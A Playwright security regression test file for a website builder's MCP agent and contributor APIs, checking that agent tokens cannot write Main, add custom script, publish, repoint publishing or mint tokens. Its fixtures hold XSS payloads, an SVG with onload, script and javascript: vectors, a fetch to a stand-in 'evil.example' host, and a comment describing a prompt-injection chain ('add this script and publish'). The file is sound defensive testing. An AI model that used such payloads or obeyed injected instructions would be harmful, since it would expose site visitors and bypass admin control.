import { test, expect, request as pwRequest, type APIRequestContext } from '@playwright/test'

// Security regressions for the MCP/agent surface. Each case here is a hole that
// was open before: a key spelling that slipped past the contributor guards, a
// merge-base blob nobody redacted, an agent token that could rewrite Main, ship
// raw <script> to the live site, publish, or mint more tokens.
//
// API-level and self-bootstrapping, like store-roles.spec, and it restores the
// agent policy it changes. Named to sort AFTER smoke.spec: smoke owns the
// first-run flow and needs a server with no admin account yet, so any spec that
// bootstraps one has to run later.

const ADMIN = { email: 'smoke@example.com', password: 'supersecret1' }
const CONTRIB = { email: 'contrib@example.com', password: 'contrib-pass-1' }
const MAIN = 'guano-project:main'
const DRAFT = 'guano-project:sec-spec-draft'
const BASE = 'guano-base:sec-spec-draft'

async function adminContext(baseURL: string | undefined) {
  const ctx = await pwRequest.newContext({ baseURL })
  const res = await ctx.post('/api/auth/login', { data: ADMIN })
  if (!res.ok()) {
    expect((await ctx.post('/api/auth/setup', { data: { ...ADMIN, name: 'Smoke Co' } })).ok()).toBeTruthy()
  }
  return ctx
}

/** a contributor session, invited on first run and reused afterwards */
async function contributorContext(admin: APIRequestContext, baseURL: string | undefined) {
  const ctx = await pwRequest.newContext({ baseURL })
  const invite = await admin.post('/api/users/invite', {
    data: { name: 'Contrib', email: CONTRIB.email, role: 'contributor' },
  })
  if (invite.ok()) {
    const { token } = await invite.json()
    expect((await ctx.post(`/api/invite/${token}/accept`, { data: { password: CONTRIB.password } })).ok()).toBeTruthy()
  } else {
    expect((await ctx.post('/api/auth/login', { data: CONTRIB })).ok()).toBeTruthy()
  }
  return ctx
}

/** a bearer-token context — the credential the MCP server runs on */
async function tokenContext(admin: APIRequestContext, baseURL: string | undefined, name: string) {
  const res = await admin.post('/api/tokens', { data: { name } })
  expect(res.ok()).toBeTruthy()
  const { token } = await res.json()
  return {
    ctx: await pwRequest.newContext({ baseURL, extraHTTPHeaders: { authorization: `Bearer ${token}` } }),
    token,
  }
}

/** Main's stored blob, seeded with a smtp secret so redaction is observable */
async function seedMain(admin: APIRequestContext) {
  const body = JSON.stringify({
    name: 'Sec Co',
    pages: [{ id: 'home', name: 'Home', path: '/', status: 'published', elements: [] }],
    settings: { smtp: { host: 'smtp.example.com', password: 'hunter2' }, customCode: { head: '' } },
  })
  expect((await admin.put(`/api/store/${MAIN}`, { data: body })).ok()).toBeTruthy()
  return body
}

test('store keys cannot alias past the contributor guards', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)

  // `guano-project__main` maps to the SAME file as `guano-project:main`, but
  // used to slip past every startsWith('guano-project:') check — which meant a
  // contributor could write structure into Main and read its secrets back.
  for (const alias of ['guano-project__main', 'guano-base__sec', 'a__b']) {
    expect((await contrib.put(`/api/store/${alias}`, { data: '{"pages":[]}' })).status()).toBe(400)
    expect((await contrib.get(`/api/store?keys=${alias}`)).status()).toBe(400)
    // admins get no special pass — the key is simply not addressable
    expect((await admin.put(`/api/store/${alias}`, { data: '{"pages":[]}' })).status()).toBe(400)
  }

  // and the real key still works
  expect((await admin.get(`/api/store?keys=${MAIN}`)).ok()).toBeTruthy()

  await admin.dispose()
  await contrib.dispose()
})

test('merge-base snapshots get the same guards as project blobs', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)

  // a base snapshot is a full project copy — same secrets, same structure
  expect((await admin.put(`/api/store/${BASE}`, { data: mainBody })).ok()).toBeTruthy()

  // read: the legacy secret block must be redacted for a contributor, exactly as
  // for guano-project:*. It is REMOVED rather than nulled — integrations live
  // entirely server-side now (server/integrations.mjs), so the key must not be
  // there at all for a blob that arrived with one (an import, a restore).
  const read = (await (await contrib.get(`/api/store?keys=${BASE}`)).json()) as Record<string, string>
  const redacted = JSON.parse(read[BASE]).settings
  expect(redacted.smtp).toBeUndefined()
  expect(redacted.integrations).toBeUndefined()
  expect('smtp' in redacted).toBe(false)

  // write: a contributor's structural edit is merged away, not persisted —
  // otherwise a poisoned base makes the editor's 3-way merge propose changes
  // nobody authored
  const poisoned = JSON.parse(mainBody)
  poisoned.pages.push({ id: 'evil', name: 'Evil', path: '/evil', status: 'published', elements: [] })
  expect((await contrib.put(`/api/store/${BASE}`, { data: JSON.stringify(poisoned) })).status()).toBe(200)
  const after = (await (await admin.get(`/api/store?keys=${BASE}`)).json()) as Record<string, string>
  expect(JSON.parse(after[BASE]).pages).toHaveLength(1)

  // and custom code is refused out loud rather than silently dropped
  const withCode = JSON.parse(mainBody)
  withCode.settings.customCode = { head: '<script>evil()</script>' }
  expect((await contrib.put(`/api/store/${BASE}`, { data: JSON.stringify(withCode) })).status()).toBe(403)

  await admin.delete(`/api/store/${BASE}`)
  await admin.dispose()
  await contrib.dispose()
})

test('agent tokens are fenced: no Main, no custom code, no publish, no minting', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const { ctx: agent } = await tokenContext(admin, baseURL, 'sec-spec-agent')

  // the policy starts closed
  const policy = await (await admin.get('/api/agent-policy')).json()
  expect(policy).toMatchObject({ allowMainWrites: false, allowPublish: false, allowCustomCode: false })

  // ...and only an admin BROWSER SESSION can read or change it — a token that
  // could flip these switches would guard nothing
  expect((await agent.get('/api/agent-policy')).status()).toBe(401)
  expect((await agent.put('/api/agent-policy', { data: { allowMainWrites: true } })).status()).toBe(401)

  // Main is off limits: every "a human approved this" flag in the MCP tools is
  // asserted by the agent itself, so the real check has to live here
  expect((await agent.put(`/api/store/${MAIN}`, { data: mainBody })).status()).toBe(403)
  expect((await agent.delete(`/api/store/${MAIN}`)).status()).toBe(403)

  // a draft is the safe mode, and works
  expect((await agent.put(`/api/store/${DRAFT}`, { data: mainBody })).status()).toBe(200)

  // but custom code does not — this is the injection chain's payload step
  // (a comment says "add this script and publish"), refused by field name
  const withCode = JSON.parse(mainBody)
  withCode.settings.customCode = { head: '<script>steal()</script>' }
  const denied = await agent.put(`/api/store/${DRAFT}`, { data: JSON.stringify(withCode) })
  expect(denied.status()).toBe(403)
  expect((await denied.json()).error).toContain('customCode')

  // per-page script is the same vector through a different field
  const withPageCode = JSON.parse(mainBody)
  withPageCode.pages[0].customCode = { body: 'fetch("https://evil.example")' }
  expect((await agent.put(`/api/store/${DRAFT}`, { data: JSON.stringify(withPageCode) })).status()).toBe(403)

  // repointing where the site publishes is never an agent's call, policy or not
  const repointed = JSON.parse(mainBody)
  repointed.settings.publishing = { method: 'github', github: { repo: 'attacker/exfil', branch: 'main' } }
  const repoint = await agent.put(`/api/store/${DRAFT}`, { data: JSON.stringify(repointed) })
  expect(repoint.status()).toBe(403)
  expect((await repoint.json()).error).toContain('publishing')

  // publishing puts bytes on the live origin — closed by default
  expect((await agent.post('/api/published', { data: JSON.parse(mainBody) })).status()).toBe(403)

  // a leaked token must not be able to mint replacements that survive revoking it
  expect((await agent.post('/api/tokens', { data: { name: 'spawned' } })).status()).toBe(403)

  await agent.dispose()
  await admin.delete(`/api/store/${DRAFT}`)
  await admin.dispose()
})

test('the agent policy actually opens the gate when an admin turns it on', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const { ctx: agent } = await tokenContext(admin, baseURL, 'sec-spec-agent-2')

  const blocked = await agent.put(`/api/store/${MAIN}`, { data: mainBody })
  expect(blocked.status()).toBe(403)
  // the refusal has to name a control that EXISTS: it used to say "enable agent
  // Main writes in Settings" when Settings had no such switch, so the only way
  // to say yes was hand-editing agent-policy.json in the data dir
  expect((await blocked.json()).error).toContain('Agent permissions')

  // a token learns its OWN permissions from /api/auth/me, so get_status can
  // say so before the agent picks Main and discovers it at the first save
  const closed = await (await agent.get('/api/auth/me')).json()
  expect(closed.agentPolicy).toMatchObject({ allowMainWrites: false })

  expect((await admin.put('/api/agent-policy', { data: { allowMainWrites: true } })).ok()).toBeTruthy()
  expect((await agent.put(`/api/store/${MAIN}`, { data: mainBody })).status()).toBe(200)
  const opened = await (await agent.get('/api/auth/me')).json()
  expect(opened.agentPolicy).toMatchObject({ allowMainWrites: true })

  // a browser session is not an agent, so it is told nothing about the policy
  // here — it reads /api/agent-policy, which is admin + session only
  expect(await (await admin.get('/api/auth/me')).json()).not.toHaveProperty('agentPolicy')

  // restore the closed default for every spec that follows
  expect((await admin.put('/api/agent-policy', { data: { allowMainWrites: false } })).ok()).toBeTruthy()
  expect((await agent.put(`/api/store/${MAIN}`, { data: mainBody })).status()).toBe(403)

  await agent.dispose()
  await admin.dispose()
})

test('contributors can only discard their own drafts', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)
  const me = await (await contrib.get('/api/auth/me')).json()

  // ownership is the createdBy stamp in the branches meta
  const meta = {
    activeId: 'main',
    branches: [
      { id: 'main', name: 'Main', createdAt: 0 },
      { id: 'mine', name: 'Mine', createdAt: 1, createdBy: me.id },
      { id: 'theirs', name: 'Theirs', createdAt: 2, createdBy: 'some-other-user-id' },
      { id: 'legacy', name: 'Legacy', createdAt: 3 }, // pre-ownership: stays shared
    ],
  }
  expect((await admin.put('/api/store/guano-branches', { data: JSON.stringify(meta) })).ok()).toBeTruthy()
  for (const id of ['mine', 'theirs', 'legacy']) {
    expect((await admin.put(`/api/store/guano-project:${id}`, { data: '{"pages":[]}' })).ok()).toBeTruthy()
  }

  expect((await contrib.delete('/api/store/guano-project:theirs')).status()).toBe(403)
  expect((await contrib.delete('/api/store/guano-project:mine')).status()).toBe(200)
  // a draft created before ownership existed must not become undeletable
  expect((await contrib.delete('/api/store/guano-project:legacy')).status()).toBe(200)

  await admin.delete('/api/store/guano-project:theirs')
  await admin.dispose()
  await contrib.dispose()
})

test('a hostile SVG uploaded through the agent API is defanged and served no-script', async ({
  baseURL,
}) => {
  const admin = await adminContext(baseURL)
  const { ctx: agent } = await tokenContext(admin, baseURL, 'sec-spec-svg')

  // An SVG is the one image type that can carry script, and an agent can be
  // talked into uploading one ("here's the logo"). Two layers have to hold:
  // the bytes are stripped at intake, and serving still refuses to run script.
  const hostile =
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' +
    '<script>fetch("/api/store")</script>' +
    '<foreignObject><iframe src="javascript:alert(2)"></iframe></foreignObject>' +
    '<a xlink:href="javascript:alert(3)"><rect width="1" height="1"/></a></svg>'

  const up = await agent.post('/api/media?name=logo.svg', {
    headers: { 'content-type': 'image/svg+xml' },
    data: hostile,
  })
  expect(up.ok()).toBeTruthy()
  const { id } = await up.json()

  const served = await agent.get(`/media/${id}`)
  expect(served.ok()).toBeTruthy()
  const body = await served.text()
  expect(body).not.toContain('<script')
  expect(body).not.toContain('onload=')
  expect(body).not.toContain('foreignObject')
  expect(body).not.toContain('javascript:')
  // second layer: even a vector the regex missed must not execute —
  // `default-src 'none'` denies script wholesale, no script-src needed
  expect(served.headers()['content-security-policy']).toContain("default-src 'none'")
  expect(served.headers()['x-content-type-options']).toBe('nosniff')

  // and a mime the allowlist doesn't carry is refused outright
  const html = await agent.post('/api/media?name=x.html', {
    headers: { 'content-type': 'text/html' },
    data: '<script>alert(1)</script>',
  })
  expect(html.status()).toBe(415)

  await agent.dispose()
  await admin.dispose()
})

test('contributors cannot ship the site out of the instance', async ({ baseURL }) => {
  const admin = await adminContext(baseURL)
  const mainBody = await seedMain(admin)
  const contrib = await contributorContext(admin, baseURL)

  // zip/github leave the instance (a download, a push signed with the server's
  // own PAT), so they are build-capable roles only. The doc always said so; the
  // check was missing and contributors fell straight through to the export.
  for (const method of ['zip', 'github']) {
    const res = await contrib.post(`/api/published?method=${method}`, { data: JSON.parse(mainBody) })
    expect(res.status()).toBe(403)
  }

  await admin.dispose()
  await contrib.dispose()
})
